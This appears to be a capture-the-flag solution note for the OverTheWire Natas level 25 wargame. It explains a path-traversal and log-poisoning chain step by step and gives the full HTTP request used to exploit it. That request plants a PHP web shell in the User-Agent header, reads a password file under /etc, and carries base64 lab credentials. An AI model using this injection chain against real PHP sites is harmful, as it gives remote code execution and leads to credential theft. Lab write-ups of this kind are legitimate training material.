@@ -1,0 +1,23 @@
+Simple 5 Steps of execution:
+
+1. Trigger — lang contains ../, which fires the traversal-detection branch
+2. Plant — that branch logs your User-Agent (your PHP payload) into a file
+3. Execute — the same code path then include()s that same file, running your payload
+4. Feed — your now-running code reads cmd from the URL
+5. Output — the command runs, result shows up in the response
+
+
+
+Request Header:
+
+GET /index.php?lang=....//logs/natas25_affvqjf8oor482fdos4fsl0sne.log&cmd=cat%20/etc/natas_webpass/natas26 HTTP/1.1
+Host: natas25.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyNTpVSkVGNU9BSEYxZVczbHFrcGRDRE03b3c0c3l6aDRvbw==
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: <?php system($_GET['cmd']); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=affvqjf8oor482fdos4fsl0sne
+Connection: keep-alive
+
